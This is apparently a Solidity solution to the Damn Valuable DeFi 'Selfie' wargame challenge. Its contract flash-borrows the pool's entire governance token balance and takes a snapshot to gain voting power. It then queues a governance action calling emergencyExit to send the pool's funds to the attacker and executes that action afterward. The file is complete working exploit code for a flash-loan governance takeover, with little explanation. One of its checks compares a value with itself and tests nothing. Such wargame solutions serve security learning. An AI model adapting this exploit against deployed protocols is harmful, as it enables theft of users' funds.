//SPDX-License-Identifier:UNLICENSED

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableBase/DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


pragma solidity ^0.8.0;

contract SelfieAttack is IERC3156FlashBorrower {

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot damnSnapshot;
    address public owner;
    uint public lastId;




    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the owner!");
        _;
    }


    constructor(address _pool, address _governance, address _token){
        owner = msg.sender;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        damnSnapshot = DamnValuableTokenSnapshot(_token);
    }




    function callFlash()public onlyOwner{

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(damnSnapshot),
            damnSnapshot.balanceOf(address(pool)),
            data
        );
    }


    function executeFunction()public onlyOwner{
        governance.executeAction(lastId);
    }



    function onFlashLoan(
        address initiator,
        address token,
        uint256,
        uint256,
        bytes calldata data
    )external returns(bytes32){
        require(msg.sender == address(pool), "Caller is not the SelfiePool!");
        require(initiator == address(this), "Caller is not the attacker address!");
        require(token == address(damnSnapshot));

        damnSnapshot.snapshot();
        require(damnSnapshot.balanceOf(address(this)) == damnSnapshot.balanceOf(address(this)));

        lastId = governance.queueAction(address(pool), 0, data);

        damnSnapshot.approve(address(pool), damnSnapshot.balanceOf(address(this)));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}
